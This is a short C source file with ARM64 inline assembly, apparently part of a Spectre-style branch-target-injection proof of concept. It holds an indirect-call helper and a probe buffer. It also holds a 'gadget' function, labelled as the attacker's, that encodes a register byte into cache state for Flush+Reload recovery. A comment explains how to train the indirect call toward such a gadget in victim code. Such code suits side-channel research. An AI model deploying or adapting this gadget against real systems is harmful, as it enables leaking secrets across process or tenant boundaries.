#include "libcall.h"



int indirect_call(int (**f)(void))
{
    /*
    asm volatile(
        "mov x20, %0\n\t"
        "ldr x20, [x20]\n\t"
        "blr x20\n\t"
        : 
        : "r"(f)
        : "x29", "x30"
    );
    */
    return (*f)();
}

char const __padding1[32768] = {0};


char const libcall_data[32768] = {0};



// attacker function
// make the value in register x21 available in the F+R buffer
// Note: the gadget could also be directly in the vicitm code (eg at address A),
// in that case the attacker should train the call with address A from its own
// address space (either mmap a function; or catch the segv).

void gadget(void)
{
    asm volatile(
        "and x21, x21, #0xff\n\t"
        "LSL x21, x21, #7\n\t"
        "ldr x21, [%0, x21]\n\t"
        : 
        : "r"(libcall_data)
        : "x21"
    );
    for(int i = 0 ; i < 1000; i++);
}